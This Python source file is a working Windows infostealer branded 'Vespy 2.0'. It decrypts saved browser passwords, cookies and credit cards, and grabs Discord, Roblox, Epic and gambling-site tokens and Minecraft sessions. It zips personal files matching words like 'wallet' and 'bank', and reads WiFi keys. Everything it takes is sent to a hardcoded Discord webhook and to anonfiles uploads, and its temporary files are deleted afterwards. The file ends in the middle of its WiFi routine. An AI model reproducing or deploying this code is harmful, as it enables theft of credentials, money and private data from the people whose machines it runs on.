import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes
import getpass;user=getpass.getuser()
from json import loads
from time import sleep
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from threading import Thread
from zipfile import ZipFile
from PIL import ImageGrab
from random import randint
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
wbh = 'https://discord.com/api/webhooks/1033330876534247424/qF3JU0UjELCBKQ65hsddSbcYKg0S-pEM8LYZdtE1ik8isOSHeZwF1nekmwx7-pExpQiK'
dtokens = []
class CookieInfo():
    def __init__(self, Cookies: str):
        if "Name : .ROBLOSECURITY" in Cookies:
            cookie = Cookies.split("\n"+"="*50)
            for i in cookie:
                if "ROBLOSECURITY" in i:
                    self.RobloxInfo(i.split("Value : ")[1].replace(" ",""))
        if "EPIC_CLIENT_SESSION" and "EPIC_SSO" in Cookies:
            cookies = Cookies.split("\n"+"="*50)
            ESC = []
            ES = []
            for i in cookies:
                if "EPIC_CLIENT_SESSION" in i:
                    ESC.append(i.split("Value : ")[1].replace(" ",""))
            for i in cookies:
                if "EPIC_SSO" in i:
                    ES.append(i.split("Value : ")[1].replace(" ",""))
            for i in range(len(ESC)):
                try:
                    self.EpicInfo(ESC[i],ES[i])
                except:pass

    def EpicInfo(self, ESC, ES):
        r=requests.get("https://www.epicgames.com/account/personal?lang=en&productName=epicgames",cookies = {'EPIC_SSO': ES,'EPIC_CLIENT_SESSION': ESC}).text
        r2 = requests.get("https://www.epicgames.com/account/v2/payment/ajaxGetWalletBalance",cookies = {'EPIC_SSO': ES,'EPIC_CLIENT_SESSION': ESC}).json()
        displayname = r.split('"displayName":{"value":"')[1].split('"')[0]
        ID = r.split('"userInfo":{"id":{"value":"')[1].split('"')[0]
        balance = r2['walletBalance']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"EPIC Games Cookies", description=f"Grabbed Epic Games Account", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f"Account of {displayname}\n", value=f":id: ID: ``{ID}``\n\n:dollar: Balance : ``{balance}``\n\n:cookie: EPIC_CLIENT_SESSION : ``{ESC[:20]}.. REST IN COOKIES``\n\n:cookie: EPIC_SSO : ``{ES}``", ineline=False)
        webhook.add_embed(embed)
        webhook.execute()

    def RobloxInfo(self, cookie: str):
        try:
            r=requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY": cookie}).json()
            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Found Roblox Cookie", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n", ineline=False)
            embed.set_thumbnail(url=r['ThumbnailUrl'])
            webhook.add_embed(embed)
            webhook.execute()
        except:pass

class Browsers():

    def __init__(self):
        self.Cookies = "-"
        self.Passwords = "-"
        self.History = "-"
        self.Downloads = "-"
        self.CCs = "-"
        self.Autofill = "-"
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for i in paths:
            if os.path.exists(i):
                key = self._key(os.path.join(i, "Local State"))
                self.cookies(i, key)
                self.passwords(i, key)
                self.history(i)
                self.downloads(i)
                self.ccs(i, key)
                self.autofill(i)
        t1 = Thread(target=self._upload)
        t2 = Thread(target=CookieInfo,args=([self.Cookies]))
        t1.start();t2.start()
                
    def _key(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    
    def _decrypt(self,b,key):
        c = AES.new(key, AES.MODE_GCM, b[3:15])
        dec = c.decrypt(b[15:])[:-16].decode()
        return dec
    
    def cookies(self,p,key):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Network", "Cookies")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
                        host_key, name, encrypted_value = V
                        dec = self._decrypt(encrypted_value,key)
                        self.Cookies += "="*50+f"\nHost : {host_key}\nName : {name}\nValue : {dec}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Cookies.encode())
        f.close()
    
    def passwords(self,p,key):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Passw.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Login Data")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Login Data")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                        url, name, password = V
                        dec = self._decrypt(password,key)
                        self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Passwords.encode())
        f.close()

    def history(self,p):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "History")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                        url, title, count, last_visit = V
                        if url and title and count and last_visit != "":
                            if len(self.History) < 100000:
                                self.History += "="*50+f"\nURL : {url}\nTitle : {title}\nVisit Count : {count}\n"
                        else:break
                cursor.close()
                con.close()
            except:pass
        f.write(self.History.encode())
        f.close()

    def downloads(self,p):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "History")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "History2"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History2")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT tab_url, target_path FROM downloads").fetchall():
                        url, path = V
                        self.Downloads += "="*50+f"\nURL : {url}\nPath : {path}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Downloads.encode())
        f.close()
    
    def autofill(self,p):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Web Data")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT name, value FROM autofill").fetchall():
                        name, value = V
                        self.Autofill += "="*50+f"\nName : {name}\nValue : {value}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.Autofill.encode())
        f.close()

    def ccs(self,p,key):
        f = open(os.path.join(os.environ["USERPROFILE"], "AppData", "credsc.txt"),"wb")
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, "Web Data")
                shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                        name, exp_month, exp_year, cne = V
                        cn = self._decrypt(cne,key)
                        self.CCs += "="*50+f"\nName : {name}\nExpiration Month : {exp_month}\nExpiration Year : {exp_year}\nCard Number : {cn}\n"
                cursor.close()
                con.close()
            except:pass
        f.write(self.CCs.encode())
        f.close()

    def _upload(self):
        apdata = os.path.join(os.environ["USERPROFILE"], "AppData")
        PasswordSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Passw.txt"),"rb")}).json()['data']['file']['url']['full']
        CookieSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Cookies.txt"),"rb")}).json()['data']['file']['url']['full']
        CredsSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "credsc.txt"),"rb")}).json()['data']['file']['url']['full']
        HistorySite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Histo.txt"),"rb")}).json()['data']['file']['url']['full']
        DownloadSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Downs.txt"),"rb")}).json()['data']['file']['url']['full']
        AutofillSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ["USERPROFILE"], "AppData", "Autofill.txt"),"rb")}).json()['data']['file']['url']['full']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"Browser Stealer", description=f"Found Information About Browsers", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f"All Info From Browsers\n\n", value=f":unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n", ineline=False)
        webhook.add_embed(embed)
        webhook.execute()
        try:
            os.remove(os.path.join(apdata, "Cookies.txt"));os.remove(os.path.join(apdata, "Passw.txt"));os.remove(os.path.join(apdata, "credsc.txt"));os.remove(os.path.join(apdata, "Histo.txt"));os.remove(os.path.join(apdata, "Downs.txt"));os.remove(os.path.join(apdata, "Autofill.txt"))
        except:
            pass



class DISCORD:

    def __init__(self):
        self.tokens = []
        roa = fr"C:\Users\{user}\AppData\Roaming"
        loc = fr"C:\Users\{user}\AppData\Local"
        paths = [f"Discord|{roa}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{roa}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{roa}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{roa}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{loc}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{roa}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{roa}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{loc}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{loc}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{loc}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{loc}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{loc}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{loc}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{loc}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{loc}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{loc}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{loc}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{loc}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{loc}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{loc}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{loc}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{loc}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{loc}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{loc}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{loc}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{loc}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{loc}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
        for i in paths:
            path = i.split("|")[1]
            name = i.split("|")[0].replace(" ","").lower()
            if "ord" in path:
                self.enc_regex(name, path, roa)
            else:
                self.regex(path)
        self.send()
    def regex(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", l):
                            try:
                                v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                if v.status_code == 200:
                                    if token not in self.tokens:
                                        dtokens.append(token)
                                        self.tokens.append(token)
                            except:pass
        except:pass
    def enc_regex(self, name, path, roa):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for I in re.findall(r"dQw4w9WgXcQ:[^\"]*", l):
                            try:
                                returned_key = self.KEY(roa+f'\\{name}\\Local State')
                                token = self.dec(base64.b64decode(I.split('dQw4w9WgXcQ:')[1]),returned_key)
                                try:
                                    v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                    if v.status_code == 200:
                                        if token not in self.tokens:
                                            dtokens.append(token)
                                            self.tokens.append(token)
                                except:pass          
                            except:pass
        except:pass
    def KEY(self, path):
        ls = json.loads(open(path,'r',encoding='utf-8').read())
        master_key = CryptUnprotectData(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],None,None,None, 0)[1]
        return master_key
    def dec(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16].decode()
            return dec
        except:pass
    def send(self):
        if len(self.tokens) > 0:
            for tok in self.tokens:
                try:
                    info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    user = info['username']+"#"+info['discriminator']
                    id = info['id']
                    email = info["email"]
                    if info["verified"]:
                        verf = ":white_check_mark:"
                    else:verf = ":x:"
                    phone = info["phone"]
                    avatar = f"https://cdn.discordapp.com/avatars/{id}/{info['avatar']}.png"
                    if info['mfa_enabled']:
                        af2 = ":white_check_mark:"
                    else:af2 = ":x:"
                    if info['premium_type']==0:
                        N=":x:"
                    elif info['premium_type']==1:
                        N="``Nitro Classic``"
                    elif info['premium_type']==2:
                        N="``Nitro Boost``"
                    elif info['premium_type']==3:
                        N="``Nitro Basic``"
                    else:N=":x:"
                    P = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    if P == []:
                        bil = ":x:"
                    else:
                        for b in P:
                            if b['type']==1:
                                bil=":credit_card:"
                            elif b['type']==2:
                                bil=":regional_indicator_p:"
                    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
                    embed = DiscordEmbed(title=f"Discord Token", description=f"Found Discord Token", color='4300d1')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
                    embed.set_footer(text='Vespy 2.0 | by : vesper')
                    embed.set_timestamp()
                    embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n:email: Email: ``{email}``\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{tok}``", ineline=False)
                    embed.set_thumbnail(url=avatar)
                    webhook.add_embed(embed)
                    webhook.execute()
                except:pass

class Roblox:

    def __init__(self):
        self.FILE = open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),"w+")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        self.clearbet = 0
        self.done = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        self.done = 0
        for i in paths:
            if os.path.exists(i):
                self.Rblxwild(i)
        self.done = 0
        for i in paths:
            if os.path.exists(i):
                self.Rbxflip(i)
        self.done = 0
        for i in paths:
            if os.path.exists(i):
                self.Bloxflip(i)
        self._upload()

    def Rblxwild(self,p):
        if self.done == 0:
            self.FILE.write("\n\n"+"="*35+"[ Rblxwild ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass

    def Rbxflip(self,p):
        if self.done == 0:
            self.FILE.write("\n\n"+"="*35+"[ Rbxflip ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass

    def Bloxflip(self,p):
        if self.done ==0:
            self.FILE.write("\n\n"+"="*35+"[ Bloxflip ]"+"="*35+"\n")
            self.done +=1
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    self.FILE.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass

    def RobloxStudio(self):
        if self.done == 0:
            self.FILE.write("\n\n"+"="*35+"[ Roblox Cookies ]"+"="*35+"\n")
            self.done +=1
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1]
                    self.robloxcookies += 1
                    self.FILE.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
    
    def _upload(self):
        self.FILE.close()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        webhook.add_file(file=open(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"),'rb').read(),filename="Roblox.txt")
        embed = DiscordEmbed(title=f"Roblox Tokens and Cookies", description=f"Found Roblox Tokens and Cookies", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f"Info Grabbed\n", value=f"\n:coin: RblxWild: ``{self.rblxwild} Tokens``\n\n:coin: Rbxflip: ``{self.rbxflip} Tokens``\n\n:coin: Bloxflip: ``{self.bloxflip} Tokens``\n\n:cookie: Roblox Cookie: ``{self.robloxcookies} Cookie``\n", ineline=False)
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(os.path.join(os.environ["USERPROFILE"], "AppData", "Roblox.txt"))

class Files:

    def __init__(self):
        self.ZIP = ZipFile(f"C:\\Users\\{user}\\AppData\\Files.zip",'w')
        self.folders = []
        self.files = 0
        self.filter = ["dll","jpg","jpeg","png","mp4","mp3","webm"]
        self.goal = ["token","webhook","password","passcode","crypto","wallet","money","school","homework","paypal","cashapp","cookies","account","bank","cash","creditcard","payment","2fa","2step","recovery","grab","nude","address","backup_codes"]
        paths = [f"{winshell.desktop()}",f"C:\\Users\\{user}\\Downloads",f"C:\\Users\\{user}\\Documents",f"C:\\Users\\{user}\\Videos",f"C:\\Users\\{user}\\Pictures",f"C:\\Users\\{user}\\Music"]
        for i in paths:
            self.Grab(i)
        self.upload_send()

    def Grab(self,_):
        try:
            if _ in self.folders:
                pass
            else:
                self.folders.append(_)
                files = os.listdir(_)
                for f in files:
                    if os.path.isdir(_+"\\"+f):
                        self.Grab(_+"\\"+f)
                    else:
                        for name in self.goal:
                            if name in f:
                                try:
                                    fname = f.split(".")[-0]
                                    fext = f.split(".")[-1]
                                    if fext not in tuple(self.filter):
                                        self.files +=1
                                        self.ZIP.write(_+"\\"+f,fname+f"_{randint(1,999)}."+fext)
                                except:pass
        except:pass
    
    def upload_send(self):
        self.ZIP.close()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open(f"C:\\Users\\{user}\\AppData\\Files.zip","rb")})
        link = file.json()['data']['file']['url']['full']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"File Grabber", description=f"User's File Grabbed", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":page_facing_up: Amount of Files Grabbed : ", value=f"``{self.files}``\n\n:file_folder: **ZIP with Grabbed files** : \n**{link}**", ineline=False)
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(f"C:\\Users\\{user}\\AppData\\Files.zip")
class Minecraft:

    def __init__(self):
        try:
            self.content = ""
            path = f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
            try:
                logs = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
                self.user = open(path+"\\usercache.json").read().split('[{"name":"')[1].split('",')[0]
                self.idd = open(path+"\\launcher_accounts.json").read().split('"remoteId" : "')[1].split('",')[0]
                self.typE = open(path+"\\launcher_accounts.json").read().split('"type" : "')[1].split('",')[0]
                with ZipFile(path+"\\Minecraft.zip",'w') as z:
                    for i in logs:
                        self.content += f"{i}\n"
                        z.write(path+"\\"+i)
                    z.close()
            except:pass
            self.send(path+"\\Minecraft.zip")
        except:
            pass
    
    def send(self,_):
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        webhook.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
        webhook.execute()

        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"Minecraft Session", description=f"Found A Minecraft Session", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":green_square: Account of :ㅤㅤㅤ", value=f"``{self.user}``", ineline=True)
        embed.add_embed_field(name=f":video_game: Type :ㅤㅤㅤ", value=f"``{self.typE}``", ineline=True)
        embed.add_embed_field(name=f":id: Remote ID :ㅤㅤㅤ", value=f"``{self.idd}``", ineline=True)
        embed.add_embed_field(name=f"\n:open_file_folder: Files Found", value=f"```{self.content}```", ineline=True)
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(_)
class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get("http://ipinfo.io/json").json()
        self.ip = f"``{con['ip']}``"
        try:
            self.hostname = f"``{con['hostname']}``"
        except:self.hostname = ":x:"
        self.city = f"``{con['city']}``"
        self.region = f"``{con['region']}``"
        self.country = f"``{con['country']}``"
        self.location = f"``{con['loc']}``"
        self.ISP = f"``{con['org']}``"
        self.postal = f"``{con['postal']}``"

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"Network Info", description=f"User's Network Info", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":ok_hand: IP : {self.ip}", value=f":label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}", ineline=True)
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall("(?:Profile\s*:\s)(.*)", subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace"))
            for nets in networks:
                nets = nets.replace("\\r\\n","")
                res = subprocess.check_output(f"netsh wlan show profile {nets} key=clear",shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode("utf-8",errors="backslashreplace")
                ssid = res.split("Type")[1].split(":")[1].split("\n")[0].split("\r")[0]
                key = res.split("Key Content")[1].split(":")[1].split("\n")[0].split("\r")[0]
